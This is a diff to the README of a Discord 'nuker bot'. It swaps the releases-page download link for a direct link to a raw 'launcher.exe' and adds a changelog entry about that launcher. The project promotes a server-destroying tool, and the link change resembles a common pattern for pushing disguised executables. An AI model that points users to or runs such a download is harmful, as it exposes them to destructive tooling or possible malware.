@@ -1,6 +1,8 @@
-# Discord Five nuker bot | Download [here](https://github.com/glitch65/Discord-Five-nuker-bot/releases)
+# Discord Five nuker bot | Download [here](https://github.com/glitch65/Discord-Five-nuker-bot/raw/launcher/launcher.exe)
 
 # Changelog:
+> v3.0 added launcher for .exe version of nuker
+
 > v2.3.1 added custom window title and nuker icon (only for .exe version of nuker)
 
 > v2.3 redesigned user interface now it looks better
